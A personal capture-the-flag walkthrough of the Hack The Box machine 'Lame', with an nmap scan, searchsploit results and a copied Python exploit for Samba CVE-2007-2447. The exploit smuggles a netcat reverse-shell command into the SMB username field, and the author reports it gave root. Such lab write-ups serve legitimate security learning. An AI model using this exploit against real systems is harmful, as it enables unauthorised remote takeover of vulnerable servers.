#nmapscan 
```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-28 23:31 EDT
Nmap scan report for 10.10.10.3
Host is up (0.10s latency).
Not shown: 996 filtered ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.3
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: DD-WRT v24-sp1 (Linux 2.4.36) (92%), OpenWrt White Russian 0.9 (Linux 2.4.30) (92%), Arris TG862G/CT cable modem (92%), Dell Integrated Remote Access Controller (iDRAC6) (92%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (92%), Linux 2.4.21 - 2.4.31 (likely embedded) (92%), Linux 2.4.27 (92%), Citrix XenServer 5.5 (Linux 2.6.18) (92%), Linux 2.6.22 (92%), Linux 2.6.27 - 2.6.28 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h00m23s, deviation: 2h49m45s, median: 21s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2021-07-28T23:32:36-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   100.49 ms 10.10.14.1
2   101.21 ms 10.10.10.3

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 64.16 seconds
```


#enumeration 
port 21,139,22,445 were open 
first tried anonnymous ftp login was successful but nothing useful as directory listing was there
smbclient was also disabled as there was no smb enumeration
so we tried to find exploits for 
1.vsftpd 2.3.4
2.smbd 3.0.20-Debian
searcploit result:
```
searchsploit samba 3.0.20
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                              |  Path
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                                                                      | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                            | unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow                                                                                       | linux/remote/7701.txt
Samba < 3.0.20 - Remote Heap Overflow                                                                                       | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                                                                               | linux_x86/dos/36741.py
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
┌──(root💀kali)-[/home/archi]
└─# searchsploit vsftpd 2.3.4
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                              |  Path
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                      | unix/remote/17491.rb
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
Both of them were metasploit ones but some wise men advised me not to use metasploit at one go for OSCP so I tried to find some exploits online
I found a very useful article with describes full enumeration and seraching exploit or CVE via nmap 
link:https://www.hackingarticles.in/smb-penetration-testing-port-445/
However the nmap script failed 
After a few google searches found tha samba-3.0.20 is vulnerable to RCE.I also 
found this https://www.exploit-db.com/exploits/16320 the same exploit as the searchsploit one and I also got the CVE:2007-2447 from this.
Finally found a python script in github which appeared useful.
```
#!/usr/bin/python
# -*- coding: utf-8 -*-

# From : https://github.com/amriunix/cve-2007-2447
# case study : https://amriunix.com/post/cve-2007-2447-samba-usermap-script/

import sys
from smb.SMBConnection import SMBConnection

def exploit(rhost, rport, lhost, lport):
        payload = 'mkfifo /tmp/hago; nc ' + lhost + ' ' + lport + ' 0</tmp/hago | /bin/sh >/tmp/hago 2>&1; rm /tmp/hago'
        username = "/=`nohup " + payload + "`"
        conn = SMBConnection(username, "", "", "")
        try:
            conn.connect(rhost, int(rport), timeout=1)
        except:
            print("[+] Payload was sent - check netcat !")

if __name__ == '__main__':
    print("[*] CVE-2007-2447 - Samba usermap script")
    if len(sys.argv) != 5:
        print("[-] usage: python " + sys.argv[0] + " <RHOST> <RPORT> <LHOST> <LPORT>")
    else:
        print("[+] Connecting !")
        rhost = sys.argv[1]
        rport = sys.argv[2]
        lhost = sys.argv[3]
        lport = sys.argv[4]
        exploit(rhost, rport, lhost, lport)
```
link:https://github.com/amriunix/CVE-2007-2447
i also had found other links but they were not that useful or I couldn't understand them
other links:https://gist.github.com/joenorton8014/19aaa00e0088738fc429cff2669b9851
This python scrpit was just OP as we got to root directly
Now I tried the metasploit one
I also tried the ftp one but it was not exploitable through meta sploit as well.

#doubts:ftp directory listing
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.
Can we enable it??
https://serverfault.com/questions/300782/ftp-not-showing-files-or-directories

